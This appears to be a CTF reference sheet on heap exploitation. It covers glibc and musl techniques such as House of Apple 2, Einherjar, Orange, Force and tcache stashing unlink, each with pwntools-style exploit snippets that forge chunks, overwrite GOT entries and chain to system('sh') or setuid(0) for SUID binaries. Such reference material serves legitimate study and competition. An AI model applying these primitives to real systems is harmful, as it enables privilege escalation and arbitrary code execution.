# CTF Pwn - Heap Techniques

## Table of Contents
- [House of Apple 2 — FSOP for glibc 2.34+](#house-of-apple-2--fsop-for-glibc-234)
  - [setcontext Variant for SUID Binaries](#setcontext-variant-for-suid-binaries)
- [House of Einherjar — Off-by-One Null Byte](#house-of-einherjar--off-by-one-null-byte)
- [Classic Heap Unlink Attack](#classic-heap-unlink-attack)
- [Heap Grooming via Application Operations](#heap-grooming-via-application-operations)
- [Custom Allocator Exploitation](#custom-allocator-exploitation)
  - [talloc Pool Header Forgery](#talloc-pool-header-forgery)
- [musl libc Heap Exploitation](#musl-libc-heap-exploitation)
- [House of Orange](#house-of-orange)
- [House of Spirit](#house-of-spirit)
- [House of Lore](#house-of-lore)
- [House of Force](#house-of-force-csaw-ctf-2016)
- [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
- [Unsafe Unlink to BSS + Top Chunk Consolidation](#unsafe-unlink-to-bss--top-chunk-consolidation)

---

## House of Apple 2 — FSOP for glibc 2.34+

**When:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.

**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.

```python
fake_file = flat({
    0x00: b' sh\x00',       # _flags = " sh\x00"
    0x20: p64(0),           # _IO_write_base = 0
    0x28: p64(1),           # _IO_write_ptr = 1
    0x88: p64(heap_addr),   # _lock
    0xa0: p64(wide_data),    # _wide_data
    0xd8: p64(io_wfile_jumps),  # vtable
}, filler=b'\x00')
```

**Safe-linking (glibc 2.32+):** tcache fd = `ptr ^ (chunk_addr >> 12)`. Mangled fd must be decoded before write.

### setcontext Variant for SUID Binaries

When exploiting SUID binaries, dash drops privileges when `uid != euid`. Replace `system(fp)` with `setcontext(fp)` to pivot to ROP chain that calls `setuid(0)` first.

```python
# Wide vtable → setcontext + 61
# RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]
fake_wide_data = flat({
    0x68: p64(0),                    # RDI = 0 for setuid(0)
    0xa0: p64(rop_chain_addr),       # RSP
    0xa8: p64(libc.sym.setuid),      # RIP = setuid
})
```

Trigger: `exit()` → `_IO_wfile_overflow` → `setcontext(fp)` → stack pivot → `setuid(0)` → `system("sh")`.

---

## House of Einherjar — Off-by-One Null Byte

**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.

**Exploit:** Set `prev_size` of next chunk to create fake backward consolidation. Forge largebin-style chunk with self-referencing `fd/bk/fd_nextsize/bk_nextsize` to pass `unlink_chunk()` checks.

```python
fake_chunk = flat({
    0x08: p64(target_size | 1),  # size with PREV_INSET
    0x10: p64(fake_addr),        # fd -> self
    0x18: p64(fake_addr),        # bk -> self
    0x20: p64(fake_addr),        # fd_nextsize -> self
    0x28: p64(fake_addr),        # bk_nextsize -> self
}, filler=b'\x00')
```

Off-by-one NUL clears victim's PREV_INUSE → `free(victim)` triggers backward consolidation → overlapping chunks → tcache poisoning.

---

## Classic Heap Unlink Attack

**When:** Old glibc (< 2.26, no tcache) or educational challenges.

```python
# Fake chunk in A's data region
fake_fd = target_addr - 0x18  # GOT entry - 3*sizeof(ptr)
fake_bk = target_addr - 0x10  # GOT entry - 2*sizeof(ptr)

# Overflow A's data into B's header
payload = p64(0) + p64(data_size) + p64(fake_fd) + p64(fake_bk)
payload += b'A' * (data_size - 32)
payload += p64(data_size) + p64(b_size & ~1)  # clear PREV_INUSE
# free(B) → unlink(A) → target_addr now contains controlled pointer
```

**Modern mitigations:** glibc 2.26+ added safe-unlinking checks. Use tcache poisoning, House of Apple 2, or House of Einherjar instead.

---

## Heap Grooming via Application Operations

**Pattern:** Multi-step create/reply/delete operations to achieve controlled heap state for exploitation.

```python
# Create posts with overflow in content field
for i in range(7):
    create_post("A"*36 + pack(got_addr) + "A"*604 + pack(plt_addr)*80)
# Fill reply buffers to heap-spray "sh" strings
for i in range(7):
    for j in range(127):
        reply_to_post(i, "sh")
# Delete 5 to create holes, create 2 in freed space
# Overlap → GOT overwrite → shell
```

---

## Custom Allocator Exploitation

### talloc Pool Header Forgery

**Pattern:** talloc (Samba/CUPS) forge fake pool headers to redirect allocations.

```c
// Pool header fields: end, object_count, hdr_fill
// talloc_chunk: next, prev, parent, child, refs, name, size, flags, pool
// Set pool boundaries to span target address → arbitrary allocation control
```

### nginx pool

Pool chains allocations with destructor callbacks. Overflow to corrupt destructor function pointer + argument. `ngx_destroy_pool()` → `system(cmd)`.

---

## musl libc Heap Exploitation

**Pattern:** Binary linked against musl libc. musl uses `meta` structures instead of chunk headers. OOB read leaks `meta->mem` pointer; arbitrary write redirects allocation.

```python
# Leak meta pointer via OOB read at offset 0x80
meta_ptr = leak_at_offset(0x80)
pie_base = meta_ptr - 0x3f20  # fixed offset for first 0x70 allocation

# Rewrite meta->mem to redirect future allocations
write_at(meta_ptr + META_MEM_OFFSET, target_addr)

# Next alloc returns target_addr — overwrite atexit handlers
alloc_and_write(atexit_list_addr, system_addr, "cat flag")
```

**Detection:** `ldd binary | grep musl` or `strings binary | grep musl`.

---

## House of Orange

**Pattern:** Trigger unsorted bin allocation without calling `free()`. Overwrite top chunk size via heap overflow. Next large allocation fails → `sysmalloc` frees old top into unsorted bin.

```python
# Corrupt top chunk size to small value
edit(0, b'A' * overflow_len + p64(0xc01))
# Request larger than corrupted top → forces sysmalloc
add(0x1000, b'B')  # Triggers unsorted bin free
# Unsorted bin attack or FSOP from here
```

**Requirements:** Heap overflow reaching top chunk metadata. glibc < 2.26 for classic variant.

---

## House of Spirit

**Pattern:** Forge fake chunk in attacker-controlled memory, `free()` it to get into bin, then reallocate.

```python
fake_chunk = flat(0, 0x41, 0, 0, 0, 0, 0, 0, 0, 0x41)
# Write fake chunk address to a pointer that gets freed()
overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)
trigger_free()  # fake chunk enters fastbin
malloc(0x38)     # returns our fake chunk → arbitrary write
```

**Key:** Both chunk size AND next chunk's size must pass validation.

---

## House of Lore

**Pattern:** Corrupt smallbin chunk's `bk` pointer to fake chunk. When smallbin used, second malloc returns fake chunk.

```python
# Free chunk_a into smallbin (via unsorted → sorted)
free(chunk_a)
malloc(large_size)  # Forces sorting

# Forge fake chunk with fd pointing back to real chunk
fake = flat(0, 0x91, addr_of_real_chunk, addr_of_fake2)

# Overwrite chunk_a->bk to fake chunk
edit_freed_chunk(chunk_a, bk=addr_of_fake)

# Two allocations from smallbin
alloc1 = malloc(0x80)  # Returns chunk_a
alloc2 = malloc(0x80)  # Returns fake → arbitrary write!
```

---

## House of Force (CSAW CTF 2016)

**Pattern:** Overwrite top chunk size to `0xffffffffffffffff`. Next malloc with calculated size moves heap pointer to arbitrary address.

```python
# Overwrite top chunk size to -1
add_card(-1, b'A'*24 + p64(0xffffffffffffffff))

# Calculate distance to target (e.g., GOT entry)
evil_size = target_addr - 16 - top_chunk_ptr
add_card(evil_size - 25, b'')

# Next allocation overlaps target
add_card(100, p64(system_addr))
# Trigger: next strtol(user_input) → system(user_input)
```

**Requirements:** glibc < 2.29. Overflow into top chunk header.

---

## tcache Stashing Unlink Attack

**Pattern:** glibc 2.29+ — exploit tcache's interaction with smallbin during `malloc()`. When tcache not full, `malloc()` from smallbin "stashes" remaining chunks into tcache. During stashing, corrupted `bk` writes arbitrary address to tcache.

```python
# Fill tcache with 7 chunks, free 2 to smallbin
for i in range(7): free(tcache[i])
free(smallbin_1); free(smallbin_2)
malloc(large)  # Sort unsorted → smallbin

# Drain tcache
for i in range(7): malloc(size)

# Corrupt smallbin_2->bk to (target - 0x10)
edit_freed_chunk(smallbin_2, bk=target_addr - 0x10)

# Allocate from smallbin — stashing writes target_addr to tcache
malloc(size)

# Next two allocations: smallbin_2, then target → arbitrary write!
malloc(size); malloc(size)
```

---

## Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)

**Pattern:** After classic unsafe unlink writes self-pointer into BSS note table, craft second fake chunk in BSS spanning to top chunk. Free it → consolidate with top chunk, relocating heap base to BSS. Subsequent malloc returns BSS memory.

```python
# Step 1: Unsafe unlink → self-pointer at bss_table[3]
add_memo(248, p64(bss_table+0x100-16) + p64(bss_table+0x100-8) + b'A'*208 + p64(prev_size))

# Step 2: Craft fake BSS chunk spanning to top chunk
fake_size = heap_base + 0x310 - bss_addr | 1
edit_memo(3, b'A'*(256-32) + p64(prev_size) + p64(fake_size) + b'A'*15)
delete_memo(1)  # consolidation moves top → BSS

# Step 3: malloc returns BSS memory — overwrite global pointers
add_memo(size, p64(environ_addr))  # leak stack from environ
```
